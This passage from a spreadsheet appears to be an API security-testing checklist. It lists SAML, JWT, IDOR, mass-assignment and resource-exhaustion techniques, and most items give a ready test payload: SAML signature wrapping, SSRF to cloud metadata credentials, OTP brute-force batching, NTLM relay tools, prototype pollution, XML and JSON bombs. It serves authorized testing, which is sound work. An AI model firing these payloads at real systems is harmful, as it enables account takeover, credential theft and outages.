    <t xml:space="preserve">Move the original signed assertion and inject a forged admin assertion. There are eight standardized XSW variants depending on signature/assertion positioning and ID/XPath referencing.</t>
  </si>
  <si>
    <t xml:space="preserve">Tool: WS-Attacker &gt; Signature Wrapping plugin | SAML Raider Burp extension &gt; XSW1..XSW8</t>
  </si>
  <si>
    <t xml:space="preserve">ibm.com/think/topics/xml-signature-wrapping | arxiv.org/pdf/2106.10460</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-021</t>
  </si>
  <si>
    <t xml:space="preserve">SAML signature stripping</t>
  </si>
  <si>
    <t xml:space="preserve">Remove the &lt;Signature&gt; element from the SAML Response entirely. Test whether an unsigned assertion is accepted (catastrophic when validators don't enforce signature presence).</t>
  </si>
  <si>
    <t xml:space="preserve">Burp &gt; Edit SAML Response &gt; Remove &lt;ds:Signature&gt;...&lt;/ds:Signature&gt; | Re-encode base64</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - SAML Security Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-022</t>
  </si>
  <si>
    <t xml:space="preserve">SAML XML comment injection</t>
  </si>
  <si>
    <t xml:space="preserve">Inject XML comments inside the NameID to exploit parsing differences between the signature canonicalizer and the application's text extraction (admin&lt;!----&gt;@evil.com).</t>
  </si>
  <si>
    <t xml:space="preserve">NameID: admin@target.com&lt;!--ignored--&gt;@evil.com | Some parsers see admin@target.com, others see the full string</t>
  </si>
  <si>
    <t xml:space="preserve">duo.com/blog - SAML XML parsing</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-023</t>
  </si>
  <si>
    <t xml:space="preserve">API key in URL exposure</t>
  </si>
  <si>
    <t xml:space="preserve">API keys passed as URL query parameters (?api_key=...) get logged in web server access logs, browser history, Referer headers when navigating away, and intermediate proxy logs.</t>
  </si>
  <si>
    <t xml:space="preserve">Find: ?api_key= ?apikey= ?token= ?access_token= in URLs | Test if header alternative is required</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-024</t>
  </si>
  <si>
    <t xml:space="preserve">API key entropy and rotation analysis</t>
  </si>
  <si>
    <t xml:space="preserve">Generate multiple API keys and analyze their entropy, structure, and predictability. Test whether keys can be rotated/revoked by the user, and whether rotation actually invalidates old keys.</t>
  </si>
  <si>
    <t xml:space="preserve">Generate 10 keys, analyze with Burp Sequencer | Try old key after rotation</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Key Management Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-025</t>
  </si>
  <si>
    <t xml:space="preserve">HTTP Basic auth over cleartext</t>
  </si>
  <si>
    <t xml:space="preserve">If the API accepts Basic auth over plain HTTP (or downgrades to HTTP), credentials are base64-encoded but trivially decoded by any network observer.</t>
  </si>
  <si>
    <t xml:space="preserve">curl -u user:pass http://api.target.com/v1/data | Test http:// even if https:// is documented</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 7617</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-026</t>
  </si>
  <si>
    <t xml:space="preserve">mTLS bypass via direct backend access</t>
  </si>
  <si>
    <t xml:space="preserve">Connect directly to the backend service, bypassing the mTLS-terminating gateway. Many deployments enforce client certificates only at the edge while the backend accepts plain HTTP.</t>
  </si>
  <si>
    <t xml:space="preserve">Find backend IP via DNS, certificate SANs, or internal docs | curl --resolve api-backend.internal:443:1.2.3.4 https://api-backend.internal/</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Transport Layer Security Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-027</t>
  </si>
  <si>
    <t xml:space="preserve">Session token entropy analysis</t>
  </si>
  <si>
    <t xml:space="preserve">Capture many session tokens and analyze with Burp Sequencer for randomness. Weak PRNG, timestamp-based, or sequential tokens enable token prediction.</t>
  </si>
  <si>
    <t xml:space="preserve">Burp &gt; Sequencer &gt; Live capture on /login response Set-Cookie | Analyze &gt;= 1000 samples</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Session Management Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-028</t>
  </si>
  <si>
    <t xml:space="preserve">2FA / OTP brute force</t>
  </si>
  <si>
    <t xml:space="preserve">Bypass per-account or per-IP rate limiting on 2FA verification using GraphQL array batching (one HTTP request, hundreds of attempts) or single-packet race conditions.</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL batch: [{query:'mutation{verify(otp:"000000")}'},...,{query:'mutation{verify(otp:"999999")}'}] | Turbo Intruder race</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Authentication Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-029</t>
  </si>
  <si>
    <t xml:space="preserve">OpenID Connect SSRF via request_uri</t>
  </si>
  <si>
    <t xml:space="preserve">Point request_uri to internal services. The IdP fetches the URL to retrieve a JWT-encoded request object, enabling blind SSRF to internal/metadata services.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /authorize?request_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/</t>
  </si>
  <si>
    <t xml:space="preserve">openid.net/specs/openid-connect-core-1_0.html#JWTRequests</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-030</t>
  </si>
  <si>
    <t xml:space="preserve">Refresh token theft and replay</t>
  </si>
  <si>
    <t xml:space="preserve">Test whether refresh tokens rotate on use (RFC 6749 best practice) and whether logout/password-change revokes outstanding refresh tokens. Static refresh tokens enable indefinite persistence.</t>
  </si>
  <si>
    <t xml:space="preserve">Capture refresh_token, use it, then try to use again | Log out, try using old refresh_token | Change password, try old refresh_token</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 6749 §10.4 | RFC 9700</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-031</t>
  </si>
  <si>
    <t xml:space="preserve">Password reset token prediction and reuse</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze password reset token entropy and one-time-use enforcement. Test reuse after first use, prediction across users, and timing-based prediction.</t>
  </si>
  <si>
    <t xml:space="preserve">Generate 50 reset tokens for known accounts | Burp Sequencer | Test reuse after redemption</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Forgot Password Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-032</t>
  </si>
  <si>
    <t xml:space="preserve">NTLM relay / Negotiate auth abuse</t>
  </si>
  <si>
    <t xml:space="preserve">On Windows-backed APIs supporting Negotiate/NTLM, test for NTLM relay attacks and missing channel binding (EPA) that allow relaying captured hashes to other services.</t>
  </si>
  <si>
    <t xml:space="preserve">Tools: ntlmrelayx.py, Responder | Capture authenticated user, relay to API</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/SecureAuthCorp/impacket</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-001</t>
  </si>
  <si>
    <t xml:space="preserve">Authorization (BOLA/IDOR - API1:2023)</t>
  </si>
  <si>
    <t xml:space="preserve">Numeric ID enumeration</t>
  </si>
  <si>
    <t xml:space="preserve">Iterate numeric resource identifiers in URL paths and query strings using a low-privileged user's token. The single most common API vulnerability — and the #1 OWASP API risk.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/users/10483/orders | for i in $(seq 10000 11000); do curl -H "Auth: &lt;user-A-token&gt;" /v1/orders/$i; done | Burp Intruder &gt; Sniper</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API Security Top 10 - API1:2023</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-002</t>
  </si>
  <si>
    <t xml:space="preserve">UUID / GUID prediction</t>
  </si>
  <si>
    <t xml:space="preserve">Detect UUIDv1 (timestamp + MAC-address based) IDs and predict adjacent values. Also test UUIDv4 implementations using weak PRNG (e.g., Math.random() in old Node.js).</t>
  </si>
  <si>
    <t xml:space="preserve">Tool: guidtool, sandwich.uuid | Identify UUID version, predict neighbors | Check Math.random() weakness</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/intruder-io/guidtool</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-003</t>
  </si>
  <si>
    <t xml:space="preserve">BOLA at each CRUD operation</t>
  </si>
  <si>
    <t xml:space="preserve">Test BOLA on GET (read), PUT (replace), PATCH (modify), and DELETE separately. Write-side BOLA is frequently missed when devs focus only on read-side controls.</t>
  </si>
  <si>
    <t xml:space="preserve">For each resource: GET /v1/orders/&lt;victim_id&gt;, PUT /v1/orders/&lt;victim_id&gt;, PATCH, DELETE — all with attacker token</t>
  </si>
  <si>
    <t xml:space="preserve">salt.security - BOLA research</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-004</t>
  </si>
  <si>
    <t xml:space="preserve">Nested-resource BOLA</t>
  </si>
  <si>
    <t xml:space="preserve">Test cross-tenant access via nested URL paths. The parent resource may be access-controlled while the nested child is not, or vice versa.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/accounts/&lt;attacker_account&gt;/transactions/&lt;victim_transaction_id&gt; | GET /v1/orgs/&lt;attacker&gt;/users/&lt;victim&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-005</t>
  </si>
  <si>
    <t xml:space="preserve">BOLA via filter parameters</t>
  </si>
  <si>
    <t xml:space="preserve">When filter/search parameters accept object IDs, test whether the server enforces ownership on the filter targets in addition to the calling user.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/orders?userId=&lt;victim&gt; | GET /v1/transactions?account=&lt;victim_account&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-006</t>
  </si>
  <si>
    <t xml:space="preserve">BOLA via referenced objects in body</t>
  </si>
  <si>
    <t xml:space="preserve">Swap nested object IDs in JSON request bodies. The endpoint authorizes the top-level resource but not the referenced sub-objects.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/transfers {"from":"&lt;attacker_acct&gt;","to":"&lt;other&gt;","linked_invoice":"&lt;victim_invoice_id&gt;"}</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-007</t>
  </si>
  <si>
    <t xml:space="preserve">BOLA in batch / bulk operations</t>
  </si>
  <si>
    <t xml:space="preserve">Mix owned and unowned object IDs in a batch operation array. Bulk endpoints often skip per-object authorization checks for performance.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/orders/batch {"ids":["&lt;owned&gt;","&lt;victim_1&gt;","&lt;victim_2&gt;"]}</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-008</t>
  </si>
  <si>
    <t xml:space="preserve">BOLA via export / report endpoints</t>
  </si>
  <si>
    <t xml:space="preserve">Export, report, and analytics endpoints often inherit data from many objects and may not check per-object ownership.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/export?orderIds=&lt;victim_1&gt;,&lt;victim_2&gt; | POST /v1/reports {"customerIds":["&lt;victim&gt;"]}</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-009</t>
  </si>
  <si>
    <t xml:space="preserve">Mass IDOR via wildcards and array params</t>
  </si>
  <si>
    <t xml:space="preserve">Some APIs accept wildcards or array parameters (id=*, id[]=) that bypass per-record authorization.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/users?id=* | GET /v1/orders?id[]=1&amp;id[]=2&amp;id[]=3 | GET /v1/data?ids=*</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-010</t>
  </si>
  <si>
    <t xml:space="preserve">Indirect object reference via search</t>
  </si>
  <si>
    <t xml:space="preserve">Search endpoints that return full object data based on partial/fuzzy matches may leak objects the searcher shouldn't see.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/users/search?email=victim@target.com | GET /v1/search?q=&lt;victim_company_name&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - IDOR variations</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-011</t>
  </si>
  <si>
    <t xml:space="preserve">BOLA via GraphQL node / connection</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL's universal node(id:) query and connection edges often bypass object-level auth because resolvers don't re-check each edge.</t>
  </si>
  <si>
    <t xml:space="preserve">query { node(id: "User:&lt;victim&gt;") { ...on User { email } } } | query { allUsers(first: 100) { edges { node { email } } } }</t>
  </si>
  <si>
    <t xml:space="preserve">graphql.org/learn/global-object-identification</t>
  </si>
  <si>
    <t xml:space="preserve">API-03-012</t>
  </si>
  <si>
    <t xml:space="preserve">BOLA via encoded / hashed IDs</t>
  </si>
  <si>
    <t xml:space="preserve">Decode base64, hex, or other encoded IDs to predict neighbors. Hashed IDs may still be predictable if based on sequential counters or timestamps.</t>
  </si>
  <si>
    <t xml:space="preserve">echo "&lt;id&gt;" | base64 -d | xxd | Check for plaintext counter + HMAC | Predict via known schema</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - Hashing and encoded IDs</t>
  </si>
  <si>
    <t xml:space="preserve">API-04-001</t>
  </si>
  <si>
    <t xml:space="preserve">Authorization (BFLA - API5:2023)</t>
  </si>
  <si>
    <t xml:space="preserve">Admin function access via low-priv token</t>
  </si>
  <si>
    <t xml:space="preserve">Test every admin/management endpoint with a normal user's token. Common when role-based checks are missing or only enforced in UI.</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Intruder over admin endpoint list | curl -H 'Auth: &lt;user-token&gt;' /v1/admin/users, /v1/admin/config</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API Security Top 10 - API5:2023</t>
  </si>
  <si>
    <t xml:space="preserve">API-04-002</t>
  </si>
  <si>
    <t xml:space="preserve">HTTP verb tampering</t>
  </si>
  <si>
    <t xml:space="preserve">Switch HTTP verbs (GET to POST/PUT/PATCH/DELETE) to reach methods missing from the ACL. Many gateways check only GET/POST.</t>
  </si>
  <si>
    <t xml:space="preserve">For protected GET /v1/admin/users, try PUT, PATCH, DELETE, COPY, MOVE, custom verbs</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Test HTTP Methods</t>
  </si>
  <si>
    <t xml:space="preserve">API-04-003</t>
  </si>
  <si>
    <t xml:space="preserve">Forced browsing to admin endpoints</t>
  </si>
  <si>
    <t xml:space="preserve">Brute-force admin path prefixes (/admin/, /api/admin/, /internal/, /mgmt/) with and without auth to find unprotected administrative functionality.</t>
  </si>
  <si>
    <t xml:space="preserve">ffuf -u https://api.target.com/FUZZ -w admin-paths.txt | kr scan -w admin-routes.kite</t>
  </si>
  <si>
    <t xml:space="preserve">API-04-004</t>
  </si>
  <si>
    <t xml:space="preserve">Vertical escalation via JWT role claim</t>
  </si>
  <si>
    <t xml:space="preserve">Modify role/groups/permissions claims in JWT and re-sign if signing key is compromised, or replay if alg:none/RS-to-HS confusion works.</t>
  </si>
  <si>
    <t xml:space="preserve">jwt_tool.py -T &lt;token&gt; | Change role:user to role:admin, groups:[user] to groups:[admin,user]</t>
  </si>
  <si>
    <t xml:space="preserve">API-04-005</t>
  </si>
  <si>
    <t xml:space="preserve">Horizontal escalation via tenant ID swap</t>
  </si>
  <si>
    <t xml:space="preserve">Modify tenant/org/workspace identifiers in headers, JWT claims, or URL paths to access other tenants' resources.</t>
  </si>
  <si>
    <t xml:space="preserve">X-Org-Id: &lt;attacker_org&gt; → X-Org-Id: &lt;victim_org&gt; | Modify JWT tenant_id claim | /v1/orgs/&lt;victim&gt;/users</t>
  </si>
  <si>
    <t xml:space="preserve">API-04-006</t>
  </si>
  <si>
    <t xml:space="preserve">Missing auth on internal / microservice endpoints</t>
  </si>
  <si>
    <t xml:space="preserve">Internal-only RPC methods, debug RPCs, and microservice-to-microservice endpoints often skip auth, assuming network-layer protection.</t>
  </si>
  <si>
    <t xml:space="preserve">Try: /internal/*, /rpc/*, /v1/internal/*, /debug/*, /admin/internal/* without auth header</t>
  </si>
  <si>
    <t xml:space="preserve">API-04-007</t>
  </si>
  <si>
    <t xml:space="preserve">Debug / health endpoint exposure</t>
  </si>
  <si>
    <t xml:space="preserve">Spring Boot Actuator, Django debug, Express debug, and similar endpoints expose configuration, env vars, and sometimes RCE.</t>
  </si>
  <si>
    <t xml:space="preserve">Paths: /actuator/*, /actuator/env, /actuator/heapdump, /health, /metrics, /debug, /api-docs</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/snicoll/spring-boot-actuator-cheatsheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-04-008</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC method-level authz bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Test each gRPC method independently with a non-privileged identity. Service-level auth (one check per Service) creates 'subtle authorization bypasses in which the mesh handles authentication while applications assume it' per the OWASP gRPC cheat sheet.</t>
  </si>
  <si>
    <t xml:space="preserve">grpcurl -H 'authorization: Bearer &lt;user-token&gt;' host:port UserService/DeleteUser | Test every method, not just the privileged-sounding ones</t>
  </si>
  <si>
    <t xml:space="preserve">cheatsheetseries.owasp.org/cheatsheets/gRPC_Security_Cheat_Sheet.html</t>
  </si>
  <si>
    <t xml:space="preserve">API-04-009</t>
  </si>
  <si>
    <t xml:space="preserve">Method-override header abuse</t>
  </si>
  <si>
    <t xml:space="preserve">Use X-HTTP-Method-Override and similar headers to bypass verb-based ACLs. The gateway sees a POST while the backend executes a DELETE.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/users/&lt;id&gt; with header X-HTTP-Method-Override: DELETE | X-HTTP-Method, X-Method-Override</t>
  </si>
  <si>
    <t xml:space="preserve">API-04-010</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL privileged mutation access</t>
  </si>
  <si>
    <t xml:space="preserve">Call mutations like deleteUser, resetPassword, promoteToAdmin (discovered via introspection or clairvoyance) with a non-privileged token.</t>
  </si>
  <si>
    <t xml:space="preserve">mutation { deleteUser(id: "&lt;victim&gt;") } | mutation { promoteUser(id: "&lt;self&gt;", role: "admin") }</t>
  </si>
  <si>
    <t xml:space="preserve">escape.tech - GraphQL security</t>
  </si>
  <si>
    <t xml:space="preserve">API-05-001</t>
  </si>
  <si>
    <t xml:space="preserve">BOPLA / Mass Assignment (API3:2023)</t>
  </si>
  <si>
    <t xml:space="preserve">Mass assignment of privilege fields</t>
  </si>
  <si>
    <t xml:space="preserve">Add unexpected fields (isAdmin, role, verified, balance) to update/create requests. The server-side ORM blindly maps JSON to model fields without an allow-list.</t>
  </si>
  <si>
    <t xml:space="preserve">PATCH /v1/users/me {"name":"foo","isAdmin":true,"role":"admin","verified":true}</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API Security Top 10 - API3:2023</t>
  </si>
  <si>
    <t xml:space="preserve">API-05-002</t>
  </si>
  <si>
    <t xml:space="preserve">Excessive data exposure</t>
  </si>
  <si>
    <t xml:space="preserve">Endpoints that return full object representations (password hash, internal tokens, PII not needed by the client) rely on UI-side filtering rather than backend filtering.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/users/me | GET /v1/products?include=internal | Check responses for password_hash, ssn, internal_notes</t>
  </si>
  <si>
    <t xml:space="preserve">API-05-003</t>
  </si>
  <si>
    <t xml:space="preserve">Property-level filtering bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Add hidden fields discovered via GraphQL introspection, schema files, or diffing different role responses to bypass property-level access control.</t>
  </si>
  <si>
    <t xml:space="preserve">Discover: diff GET /v1/users/me (admin) vs GET /v1/users/me (user) | Inject hidden fields in update</t>
  </si>
  <si>
    <t xml:space="preserve">API-05-004</t>
  </si>
  <si>
    <t xml:space="preserve">Hidden field enumeration</t>
  </si>
  <si>
    <t xml:space="preserve">Diff responses across user roles, fuzz a property-name wordlist on update endpoints, and check for fields that are accepted but silently dropped or applied.</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Intruder over property names: isAdmin, role, balance, verified, owner, tenant_id, internal_flag</t>
  </si>
  <si>
    <t xml:space="preserve">API-05-005</t>
  </si>
  <si>
    <t xml:space="preserve">MongoDB operator injection in body</t>
  </si>
  <si>
    <t xml:space="preserve">Inject MongoDB update operators ($set, $push, $inc, $unset) directly in JSON bodies. Vulnerable when the app passes raw JSON to db.collection.update().</t>
  </si>
  <si>
    <t xml:space="preserve">PATCH /v1/users/me {"$set":{"role":"admin"}} | {"$push":{"roles":"admin"}} | {"$inc":{"balance":99999}}</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - NoSQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-05-006</t>
  </si>
  <si>
    <t xml:space="preserve">Prototype pollution via mass assignment</t>
  </si>
  <si>
    <t xml:space="preserve">Inject __proto__, constructor.prototype, or constructor in JSON bodies. In vulnerable Node.js, this pollutes Object.prototype, affecting all subsequent operations.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/profile {"__proto__":{"isAdmin":true}} | {"constructor":{"prototype":{"role":"admin"}}}</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/prototype-pollution</t>
  </si>
  <si>
    <t xml:space="preserve">API-05-007</t>
  </si>
  <si>
    <t xml:space="preserve">Nested object mass assignment</t>
  </si>
  <si>
    <t xml:space="preserve">Inject hidden fields inside nested objects (address.country_code, profile.admin_flag) where the ORM recursively binds without validation.</t>
  </si>
  <si>
    <t xml:space="preserve">PATCH /v1/users/me {"profile":{"role":"admin","trust_level":99}}</t>
  </si>
  <si>
    <t xml:space="preserve">API-05-008</t>
  </si>
  <si>
    <t xml:space="preserve">Read-only field overwrite</t>
  </si>
  <si>
    <t xml:space="preserve">Overwrite fields the API documentation marks as read-only (createdAt, id, ownerId). Often relied upon for security but not enforced.</t>
  </si>
  <si>
    <t xml:space="preserve">PATCH /v1/orders/&lt;id&gt; {"id":"&lt;other_id&gt;","ownerId":"&lt;self&gt;","createdAt":"2020-01-01","price":0.01}</t>
  </si>
  <si>
    <t xml:space="preserve">API-05-009</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL input-type over-posting</t>
  </si>
  <si>
    <t xml:space="preserve">Supply extra fields in GraphQL mutation input objects beyond what the documented input expects. Vulnerable when resolvers spread the input into the ORM.</t>
  </si>
  <si>
    <t xml:space="preserve">mutation { updateProfile(input: {name: "foo", role: "admin", verified: true}) }</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-001</t>
  </si>
  <si>
    <t xml:space="preserve">Unrestricted Resource Consumption (API4:2023)</t>
  </si>
  <si>
    <t xml:space="preserve">Rate-limit bypass via IP-spoof headers</t>
  </si>
  <si>
    <t xml:space="preserve">Rotate X-Forwarded-For, X-Real-IP, X-Originating-IP, X-Client-IP, and Forwarded headers across many values. Gateways often rate-limit on these trusted-but-spoofable headers.</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Intruder &gt; Headers &gt; Payload: random IPs | curl -H 'X-Forwarded-For: $(shuf -i 1-255 -n 4 | paste -sd .)'</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API Security Top 10 - API4:2023</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-002</t>
  </si>
  <si>
    <t xml:space="preserve">Per-account vs per-IP rate-limit gap</t>
  </si>
  <si>
    <t xml:space="preserve">Rate limits applied per-account miss credential-stuffing attacks distributed across many accounts; per-IP limits miss CGNAT and proxy attacks.</t>
  </si>
  <si>
    <t xml:space="preserve">Distribute across 10+ accounts/tokens with same payload | Test both same-account and same-IP saturation</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-003</t>
  </si>
  <si>
    <t xml:space="preserve">ReDoS in input validation</t>
  </si>
  <si>
    <t xml:space="preserve">Find input validation regexes vulnerable to catastrophic backtracking. Submit payloads that force exponential evaluation time.</t>
  </si>
  <si>
    <t xml:space="preserve">Payloads: 'a'*100 + '!' against /^(a+)+$/ regex | Validate email, URL, complex format fields</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-004</t>
  </si>
  <si>
    <t xml:space="preserve">ZIP bomb upload</t>
  </si>
  <si>
    <t xml:space="preserve">Upload nested or overlapping ZIP files that decompress to gigabytes/terabytes. Crashes archive-extraction features (resume parsers, document converters).</t>
  </si>
  <si>
    <t xml:space="preserve">Generate: 42.zip (4.5PB decompressed) or recursive zip | Test upload to docs/CV/import features</t>
  </si>
  <si>
    <t xml:space="preserve">research.swtch.com/zip</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-005</t>
  </si>
  <si>
    <t xml:space="preserve">XML bomb (billion laughs)</t>
  </si>
  <si>
    <t xml:space="preserve">Nested XML entity expansion in SOAP, REST-with-XML, and any XML-parsing endpoint. Single 1KB payload expands to gigabytes of memory.</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;!DOCTYPE x [&lt;!ENTITY a "AA"&gt;&lt;!ENTITY b "&amp;a;&amp;a;"&gt;...&lt;!ENTITY j "&amp;i;&amp;i;"&gt;]&gt;&lt;x&gt;&amp;j;&lt;/x&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/vulnerabilities/XML_Entity_Expansion</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-006</t>
  </si>
  <si>
    <t xml:space="preserve">JSON bomb / deep nesting</t>
  </si>
  <si>
    <t xml:space="preserve">Send deeply nested JSON (10,000+ levels of {} or []) to crash the parser via stack overflow or memory exhaustion.</t>
  </si>
  <si>
    <t xml:space="preserve">python -c "print('{\"a\":'*10000 + '1' + '}'*10000)" &gt; bomb.json | curl -d @bomb.json</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-007</t>
  </si>
  <si>
    <t xml:space="preserve">Large file upload DoS</t>
  </si>
  <si>
    <t xml:space="preserve">Upload files larger than the application expects. Verify whether size limits are enforced server-side, not just in HTML.</t>
  </si>
  <si>
    <t xml:space="preserve">dd if=/dev/zero of=10gb.bin bs=1G count=10 | curl -F 'file=@10gb.bin' /v1/upload</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - File Upload Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-008</t>
  </si>
  <si>
    <t xml:space="preserve">Expensive pagination abuse</t>
  </si>
  <si>
    <t xml:space="preserve">Request enormous page sizes (limit=999999, page_size=-1, per_page=2147483647) to exhaust memory via unbounded query results.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/users?limit=999999 | ?page_size=-1 | ?per_page=2147483647 | Try float values, negative</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-009</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL query-depth attack</t>
  </si>
  <si>
    <t xml:space="preserve">Construct deeply nested queries exploiting circular references (User → friends → User → friends → ...) without depth limits.</t>
  </si>
  <si>
    <t xml:space="preserve">query { user(id:1) { friends { friends { friends { friends { friends { name }}}}}}}</t>
  </si>
  <si>
    <t xml:space="preserve">escape.tech/blog/graphql-batch-attacks-cause-dos</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-010</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL complexity / field duplication</t>
  </si>
  <si>
    <t xml:space="preserve">Duplicate expensive fields hundreds of times in a single query. Without cost analysis (e.g., graphql-cost-analysis), each duplicate triggers a full backend operation.</t>
  </si>
  <si>
    <t xml:space="preserve">query { a:expensiveCompute b:expensiveCompute c:expensiveCompute ...z9:expensiveCompute }</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/pa-bru/graphql-cost-analysis</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-011</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL alias-based amplification</t>
  </si>
  <si>
    <t xml:space="preserve">Use hundreds of aliases to turn one HTTP request into hundreds of resolver calls — bypassing rate limiters that count HTTP requests, not GraphQL operations.</t>
  </si>
  <si>
    <t xml:space="preserve">Generate: a1:login(user:"x",pass:"1") a2:login(...) ... a999:login(...) | Tool: BatchQL</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-012</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL circular fragment DoS</t>
  </si>
  <si>
    <t xml:space="preserve">Define recursive fragment references that the GraphQL parser fails to detect as infinite. Some implementations crash on parse before query depth limits apply.</t>
  </si>
  <si>
    <t xml:space="preserve">fragment A on User { friends { ...B } } fragment B on User { friends { ...A } }</t>
  </si>
  <si>
    <t xml:space="preserve">escape.tech - GraphQL DoS</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-013</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC streaming DoS</t>
  </si>
  <si>
    <t xml:space="preserve">Open many long-lived bidirectional streams and send burst client-streaming messages. Each stream consumes memory; no rate-limit by default.</t>
  </si>
  <si>
    <t xml:space="preserve">Tool: grpcurl with stream method | Custom client opening 10,000 streams | Burst client-streaming</t>
  </si>
  <si>
    <t xml:space="preserve">levo.ai/resources/blogs/grpc-api-testing</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-014</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC oversized message</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC default max message size is 4 MiB (4,194,304 bytes). Target endpoints where this is raised or where integer-overflow fields allow bypass.</t>
  </si>
  <si>
    <t xml:space="preserve">Craft message &gt;4MB via fuzzed field | Look for ResourceExhausted error or absence (suggests limit raised)</t>
  </si>
  <si>
    <t xml:space="preserve">grpc.io/docs/guides/performance | nvd.nist.gov</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-015</t>
  </si>
  <si>
    <t xml:space="preserve">Wallet / billing exhaustion</t>
  </si>
  <si>
    <t xml:space="preserve">Trigger costly third-party API calls (SMS sends, paid compute, AI API calls) from your endpoint. Cost-of-attack to victim can be hundreds of dollars per minute.</t>
  </si>
  <si>
    <t xml:space="preserve">Spam /api/sms/send, /api/notifications/email, /api/translate, /api/llm/complete | Watch billing alerts</t>
  </si>
  <si>
    <t xml:space="preserve">API-06-016</t>
  </si>
  <si>
    <t xml:space="preserve">Memory exhaustion via unbounded array params</t>
  </si>
  <si>
